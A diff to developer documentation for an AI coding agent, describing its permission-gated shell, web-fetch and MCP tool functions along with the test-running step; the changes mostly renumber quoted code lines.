-- All checkable files changed this session (`since=self.started`) must pass `check_workspace` first. Then the permission gate (`run_tests`), then
-  `python -m unittest discover` through the runner, returning exit code and output.
+- All checkable files changed this session (`since=self.started`) must pass `check_workspace` first. Then the permission
+  gate (`run_tests`; the question names your `test_command` when there is one), then the runner runs the tests — your
+  `test_command`, or the tool it finds for the project (pytest, unittest, `npm test`, `go test`, `cargo test`) —
+  returning exit code and output.
 
 ```python
-447 |     def _run_shell(self, args: dict) -> str:
-448 |         command = str(args["command"]).strip()
-449 |         if not command:
-450 |             return "ERROR: empty command"
-451 |         denied = self._permitted("run_shell", command, f"run ({self.runner.shell_label}): {command}")
-452 |         if denied:
-453 |             return denied
-454 |         code, output = self.runner.run("shell", [command])
-455 |         return f"exit code {code}\n{output}"
-456 | 
-457 |     # ----- reaching outside: web pages and MCP servers ----------------------
+538 |     def _run_shell(self, args: dict) -> str:
+539 |         command = str(args["command"]).strip()
+540 |         if not command:
+541 |             return "ERROR: empty command"
+542 |         denied = self._permitted("run_shell", command, f"run ({self.runner.shell_label}): {command}")
+543 |         if denied:
+544 |             return denied
+545 |         code, output = self.runner.run("shell", [command])
+546 |         return f"exit code {code}\n{output}"
+547 | 
+548 |     # ----- reaching outside: web pages and MCP servers ----------------------
 ```
 - Only exists when the runner offers a shell (Docker, or `--allow-shell`). Refuses an empty command, passes the
   permission gate with the command line as subject (question: `run (<where>): <command>`), then runs it through the
@@ -711,44 +871,44 @@ Like Claude Code's hooks. In `settings.json`:
 
 ## Reaching outside: web pages and MCP servers
 ```python
-458 |     def _fetch_url(self, args: dict) -> str:
-459 |         url = str(args["url"]).strip()
-460 |         denied = self._permitted("fetch_url", url, f"fetch the web page {url}")
-461 |         if denied:
-462 |             return denied
-463 |         try:
-464 |             text = fetch_text(url)
-465 |         except ValueError as exc:
-466 |             return f"ERROR: could not fetch {url}: {exc}"
-467 |         return truncate(text, self._cfg.max_output_chars) or "(the page has no text)"
-468 | 
+549 |     def _fetch_url(self, args: dict) -> str:
+550 |         url = str(args["url"]).strip()
+551 |         denied = self._permitted("fetch_url", url, f"fetch the web page {url}")
+552 |         if denied:
+553 |             return denied
+554 |         try:
+555 |             text = fetch_text(url)
+556 |         except ValueError as exc:
+557 |             return f"ERROR: could not fetch {url}: {exc}"
+558 |         return truncate(text, self._cfg.max_output_chars) or "(the page has no text)"
+559 | 
 ```
 - Permission gate with the URL as subject, then `fetch_text` (see `web.md`); a fetch problem becomes `ERROR: could not
   fetch ...`; the text is cut to `max_output_chars`.
 
 ```python
-469 |     def _start_mcp(self, servers: dict) -> None:
-470 |         """Start each configured MCP server and add its tools as ``mcp__<server>__<tool>``."""
-471 |         for name, spec in servers.items():
-472 |             if not isinstance(spec, dict) or not spec.get("command"):
-473 |                 self.notes.append(f"MCP server '{name}': needs a \"command\"; skipped")
-474 |                 continue
-475 |             server = MCPServer(name, str(spec["command"]), [str(a) for a in spec.get("args", [])],
-476 |                                {str(k): str(v) for k, v in spec.get("env", {}).items()}, self._root)
-477 |             try:
-478 |                 server.start()
-479 |             except MCPError as exc:
-480 |                 server.close()
-481 |                 self.notes.append(f"{exc}; skipped")
-482 |                 continue
-483 |             self._mcp.append(server)
-484 |             for tool in server.tools:
-485 |                 full = re.sub(r"[^A-Za-z0-9_-]", "_", f"mcp__{name}__{tool['name']}")[:64]
-486 |                 description = str(tool.get("description", ""))[:500] or f"MCP tool from {name}"
-487 |                 self._tools[full] = Tool(full, description, clean_schema(tool.get("inputSchema")),
-488 |                                          self._mcp_caller(server, str(tool["name"]), full))
-489 |             self.notes.append(f"MCP server '{name}': {len(server.tools)} tool(s)")
-490 | 
+560 |     def _start_mcp(self, servers: dict) -> None:
+561 |         """Start each configured MCP server and add its tools as ``mcp__<server>__<tool>``."""
+562 |         for name, spec in servers.items():
+563 |             if not isinstance(spec, dict) or not spec.get("command"):
+564 |                 self.notes.append(f"MCP server '{name}': needs a \"command\"; skipped")
+565 |                 continue
+566 |             server = MCPServer(name, str(spec["command"]), [str(a) for a in spec.get("args", [])],
+567 |                                {str(k): str(v) for k, v in spec.get("env", {}).items()}, self._root)
+568 |             try:
+569 |                 server.start()
+570 |             except MCPError as exc:
+571 |                 server.close()
+572 |                 self.notes.append(f"{exc}; skipped")
+573 |                 continue
+574 |             self._mcp.append(server)
+575 |             for tool in server.tools:
+576 |                 full = re.sub(r"[^A-Za-z0-9_-]", "_", f"mcp__{name}__{tool['name']}")[:64]
+577 |                 description = str(tool.get("description", ""))[:500] or f"MCP tool from {name}"
+578 |                 self._tools[full] = Tool(full, description, clean_schema(tool.get("inputSchema")),
+579 |                                          self._mcp_caller(server, str(tool["name"]), full))
+580 |             self.notes.append(f"MCP server '{name}': {len(server.tools)} tool(s)")
+581 | 
 ```
 - For each configured server: it must have a `command` (otherwise a note says it was skipped); it is started in the
   project folder with its arguments and environment; a server that fails to start is closed and noted.
@@ -757,18 +917,18 @@ Like Claude Code's hooks. In `settings.json`:
   a cleaned argument schema (`clean_schema`). A note reports how many tools each server added.
 
 ```python
-491 |     def _mcp_caller(self, server: MCPServer, tool: str, full: str) -> Callable[[dict], str]:
-492 |         """The function behind one MCP tool: ask permission, then forward the call."""
-493 |         def call(args: dict) -> str:
-494 |             shown = json.dumps(args, sort_keys=True)
-495 |             denied = self._permitted(full, shown, f"use MCP tool {server.name}/{tool} {shown[:200]}")
-496 |             if denied:
-497 |                 return denied
-498 |             try:
-499 |                 return server.call_tool(tool, args, timeout=self._cfg.command_timeout * 4)
-500 |             except MCPError as exc:
-501 |                 return f"ERROR: {exc}"
-502 |         return call
+582 |     def _mcp_caller(self, server: MCPServer, tool: str, full: str) -> Callable[[dict], str]:
+583 |         """The function behind one MCP tool: ask permission, then forward the call."""
+584 |         def call(args: dict) -> str:
+585 |             shown = json.dumps(args, sort_keys=True)
+586 |             denied = self._permitted(full, shown, f"use MCP tool {server.name}/{tool} {shown[:200]}")
+587 |             if denied:
+588 |                 return denied
+589 |             try:
+590 |                 return server.call_tool(tool, args, timeout=self._cfg.command_timeout * 4)
+591 |             except MCPError as exc:
+592 |                 return f"ERROR: {exc}"
+593 |         return call
 ```
 - Builds the function behind one MCP tool. It shows the arguments as sorted JSON (the permission subject and part of the
   question), passes the permission gate, then forwards the call with a generous timeout (4× the command timeout);
